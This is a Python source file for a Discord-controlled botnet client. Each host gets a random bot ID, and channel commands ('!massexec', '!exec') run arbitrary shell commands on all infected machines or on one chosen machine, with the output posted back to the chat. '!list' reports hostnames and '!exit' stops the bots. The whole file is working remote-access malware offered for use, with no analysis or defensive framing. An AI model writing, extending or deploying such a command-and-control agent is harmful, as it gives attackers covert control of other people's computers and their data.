import discord
import asyncio
import sys,os,string
import subprocess as sub
import random

client = discord.Client()
######################################################################################
#generate bot unique id
######################################################################################
def generate(length):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

######################################################################################
#display in console
######################################################################################

@client.event
async def on_ready():
    print('Logged in as')
    print(client.user.name)
    print(client.user.id)
    print('------')
    global botname
    botname = generate(5)
    print('Bot Secret: {0}'.format(botname))

@client.event
async def on_message(message):

######################################################################################
#shutdown all bots
######################################################################################
    if message.content.startswith('!exit'):
        sys.exit(1)

######################################################################################
#displays list of all botnames
######################################################################################

    if message.content.startswith('!botname'):
        await client.send_message(message.channel, 'Bot Code: {0}'.format(botname))

######################################################################################
#mass execute command to all bots
######################################################################################

    if message.content.startswith('!massexec'):
        command, variable = message.content.split(' ', 2)

        cmd = sub.check_output('{}'.format(variable), shell=True,stderr=sub.STDOUT).decode('ascii')

        tmp = await client.send_message(message.channel, 'Executing command...')
        async for log in client.logs_from(message.channel, limit=100): 
            await client.edit_message(tmp, '{}'.format(cmd))

######################################################################################
#exec direct command to bot //syntax = !exec botid command
######################################################################################
    if message.content.startswith('!exec'):
        command, botid, variable = message.content.split(' ', 2)
        if botid == botname:

            cmd = sub.check_output('{}'.format(variable), shell=True,stderr=sub.STDOUT).decode('ascii')

            tmp = await client.send_message(message.channel, 'Executing command...')
            async for log in client.logs_from(message.channel, limit=100): 
                await client.edit_message(tmp, '{}'.format(cmd))

######################################################################################
#return list of online bots with unique ID
######################################################################################

    if message.content.startswith('!list'):
        tmp = await client.send_message(message.channel, 'Calculating messages...')
        online = sub.check_output(['hostname']).decode('ascii')
        async for log in client.logs_from(message.channel, limit=100):
            await client.edit_message(tmp, 'Online: {0} ID: {1}'.format(online, botname))

######################################################################################
#sleep bot for 5 seconds
######################################################################################
    elif message.content.startswith('!sleep'):
        await asyncio.sleep(5)
        await client.send_message(message.channel, 'Done sleeping')

client.run('token')
